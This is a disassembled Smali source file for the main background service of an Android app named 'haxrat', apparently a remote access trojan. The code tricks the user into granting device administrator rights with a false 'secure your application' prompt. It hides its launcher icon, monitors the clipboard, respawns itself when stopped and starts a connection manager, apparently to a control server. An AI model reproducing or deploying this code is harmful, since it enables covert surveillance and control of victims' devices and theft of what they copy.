.class public Lcom/hax4us/haxrat/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/MainService$100000000;,
        Lcom/hax4us/haxrat/MainService$100000001;
    }
.end annotation


# static fields
.field private static contextOfApplication:Landroid/content/Context;

.field public static mAdminName:Landroid/content/ComponentName;

.field public static mDPM:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 134
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static findContext()V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 85
    :try_start_0
    const-string v6, "android.app.ActivityThread"

    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v6

    move-object v1, v6

    .line 92
    move-object v6, v1

    const-string v7, "currentApplication"

    const/4 v8, 0x0

    new-array v8, v8, [Ljava/lang/Class;

    invoke-virtual {v6, v7, v8}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    move-object v2, v6

    .line 93
    move-object v6, v2

    const/4 v7, 0x0

    check-cast v7, Ljava/lang/Object;

    const/4 v8, 0x0

    check-cast v8, [Ljava/lang/Object;

    invoke-virtual {v6, v7, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/content/Context;

    move-object v3, v6

    .line 94
    move-object v6, v3

    if-nez v6, :cond_0

    .line 96
    new-instance v6, Landroid/os/Handler;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v8

    invoke-direct {v7, v8}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    move-object v4, v6

    .line 97
    move-object v6, v4

    new-instance v7, Lcom/hax4us/haxrat/MainService$100000001;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    move-object v9, v2

    invoke-direct {v8, v9}, Lcom/hax4us/haxrat/MainService$100000001;-><init>(Ljava/lang/reflect/Method;)V

    invoke-virtual {v6, v7}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    move-result v6

    .line 109
    :goto_0
    return-void

    .line 85
    :catch_0
    move-exception v6

    move-object v2, v6

    .line 90
    goto :goto_0

    .line 109
    :cond_0
    move-object v6, v3

    invoke-static {v6}, Lcom/hax4us/haxrat/MainService;->startService(Landroid/content/Context;)V

    goto :goto_0
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 3

    .prologue
    .line 133
    sget-object v2, Lcom/hax4us/haxrat/MainService;->contextOfApplication:Landroid/content/Context;

    move-object v0, v2

    return-object v0
.end method

.method public static start()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 116
    :try_start_0
    invoke-static {}, Lcom/hax4us/haxrat/MainService;->findContext()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v3

    move-object v1, v3

    goto :goto_0
.end method

.method public static startService(Landroid/content/Context;)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    .prologue
    .line 122
    move-object v0, p0

    move-object v4, v0

    new-instance v5, Landroid/content/Intent;

    move-object v12, v5

    move-object v5, v12

    move-object v6, v12

    move-object v7, v0

    :try_start_0
    const-string v8, "com.hax4us.haxrat.MainService"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v8

    invoke-direct {v6, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v5}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v4

    return-void

    :catch_0
    move-exception v4

    move-object v2, v4

    new-instance v4, Ljava/lang/NoClassDefFoundError;

    move-object v12, v4

    move-object v4, v12

    move-object v5, v12

    move-object v6, v2

    invoke-virtual {v6}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v4
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 35
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onDestroy()V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 127
    move-object v0, p0

    move-object v2, v0

    invoke-super {v2}, Landroid/app/Service;->onDestroy()V

    .line 128
    move-object v2, v0

    new-instance v3, Landroid/content/Intent;

    move-object v6, v3

    move-object v3, v6

    move-object v4, v6

    const-string v5, "respawnService"

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Lcom/hax4us/haxrat/MainService;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 20
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 41
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move/from16 v2, p2

    move/from16 v3, p3

    move-object v11, v0

    invoke-virtual {v11}, Lcom/hax4us/haxrat/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v11

    move-object v5, v11

    .line 42
    move-object v11, v0

    const-string v12, "device_policy"

    invoke-virtual {v11, v12}, Lcom/hax4us/haxrat/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/app/admin/DevicePolicyManager;

    sput-object v11, Lcom/hax4us/haxrat/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;

    .line 43
    new-instance v11, Landroid/content/ComponentName;

    move-object/from16 v19, v11

    move-object/from16 v11, v19

    move-object/from16 v12, v19

    move-object v13, v0

    :try_start_0
    const-string v14, "com.hax4us.haxrat.DeviceAdmin"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v14

    invoke-direct {v12, v13, v14}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sput-object v11, Lcom/hax4us/haxrat/MainService;->mAdminName:Landroid/content/ComponentName;

    .line 44
    sget-object v11, Lcom/hax4us/haxrat/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;

    sget-object v12, Lcom/hax4us/haxrat/MainService;->mAdminName:Landroid/content/ComponentName;

    invoke-virtual {v11, v12}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v11

    if-nez v11, :cond_0

    .line 45
    new-instance v11, Landroid/content/Intent;

    move-object/from16 v19, v11

    move-object/from16 v11, v19

    move-object/from16 v12, v19

    const-string v13, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v12, v13}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object v7, v11

    .line 46
    move-object v11, v7

    const-string v12, "android.app.extra.DEVICE_ADMIN"

    sget-object v13, Lcom/hax4us/haxrat/MainService;->mAdminName:Landroid/content/ComponentName;

    invoke-virtual {v11, v12, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v11

    .line 47
    move-object v11, v7

    const-string v12, "android.app.extra.ADD_EXPLANATION"

    const-string v13, "Click on Activate button to secure your application."

    invoke-virtual {v11, v12, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v11

    .line 50
    :cond_0
    move-object v11, v5

    new-instance v12, Landroid/content/ComponentName;

    move-object/from16 v19, v12

    move-object/from16 v12, v19

    move-object/from16 v13, v19

    move-object v14, v0

    :try_start_1
    const-string v15, "com.hax4us.haxrat.MainActivity"

    invoke-static {v15}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v15

    invoke-direct {v13, v14, v15}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v13, 0x2

    const/4 v14, 0x1

    invoke-virtual {v11, v12, v13, v14}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 54
    new-instance v11, Lcom/hax4us/haxrat/MainService$100000000;

    move-object/from16 v19, v11

    move-object/from16 v11, v19

    move-object/from16 v12, v19

    move-object v13, v0

    invoke-direct {v12, v13}, Lcom/hax4us/haxrat/MainService$100000000;-><init>(Lcom/hax4us/haxrat/MainService;)V

    move-object v8, v11

    .line 75
    move-object v11, v0

    const-string v12, "clipboard"

    invoke-virtual {v11, v12}, Lcom/hax4us/haxrat/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/content/ClipboardManager;

    move-object v9, v11

    .line 76
    move-object v11, v9

    move-object v12, v8

    invoke-virtual {v11, v12}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 79
    move-object v11, v0

    sput-object v11, Lcom/hax4us/haxrat/MainService;->contextOfApplication:Landroid/content/Context;

    .line 80
    move-object v11, v0

    invoke-static {v11}, Lcom/hax4us/haxrat/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 81
    const/4 v11, 0x1

    move v0, v11

    return v0

    .line 43
    :catch_0
    move-exception v11

    move-object v6, v11

    new-instance v11, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v19, v11

    move-object/from16 v11, v19

    move-object/from16 v12, v19

    move-object v13, v6

    invoke-virtual {v13}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v11

    .line 50
    :catch_1
    move-exception v11

    move-object v7, v11

    new-instance v11, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v19, v11

    move-object/from16 v11, v19

    move-object/from16 v12, v19

    move-object v13, v7

    invoke-virtual {v13}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v11
.end method
